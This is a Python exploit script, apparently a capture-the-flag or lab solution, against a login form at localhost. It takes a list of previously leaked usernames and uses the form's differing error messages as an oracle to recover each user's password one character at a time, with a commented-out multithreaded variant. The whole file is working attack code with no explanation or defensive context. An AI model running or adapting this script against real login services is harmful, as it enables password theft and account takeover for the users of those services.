import requests
import re
import concurrent.futures
from string import printable
from itertools import repeat
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor

HOST = "http://localhost:8888"

# Leak username that we get before
unames = ["john", "hana", "cow", "steve"]

error_re = re.compile(
    r'<p style="color:red"><strong>Error:</strong> (?P<error>.*)</p>')
s = requests.Session()
char_set = printable[:62] + " "


def check_error(err):
  mo = error_re.search(err)
  if mo:
    msg = mo.group("error")
    if msg == "Wrong password":
      return False
    elif msg == "Try again":
      return True
  return None


def check_char(payload, ch):
  payload["password"] += ch
  print("Try", payload["password"])
  return s.post(HOST + "/login", data=payload, allow_redirects=False).text


# Leak user password using error oracle
def oracle(username):
  payload = {
      "username": username,
      "password": ""
  }
  resp = s.post(HOST + "/login", data=payload, allow_redirects=False).text
  while check_error(resp) != None:
    current_pw = payload["password"]
    for c in char_set:
      payload["password"] = current_pw + c
      print("Try:", payload["password"])
      resp = s.post(HOST + "/login", data=payload, allow_redirects=False).text
      if check_error(resp) != False:
        print("Correct")
        break
    # Multithread solution -> server can't handle all of request
    # result_list = []
    # with ProcessPoolExecutor(max_workers=8) as executor:
    #   future_to_char = {executor.submit(
    #       check_char, payload, c): c for c in char_set}
    #   for future in concurrent.futures.as_completed(future_to_char):
    #     char = future_to_char[future]
    #     try:
    #       result = future.result()
    #       result_list.append((check_error(result), char))
    #     except Exception as exc:
    #       print(f"{char} got exception: {exc}")
    # for r, c in result_list:
    #   if r != False:
    #     payload["password"] += c
    #     print("Found", payload["password"])
    #     break
  return payload["password"]


def main():
  for name in unames:
    print(f"Leak password for user {name}")
    password = oracle(name)
    print(f"Got {name} password: {password}")


if __name__ == "__main__":
  main()
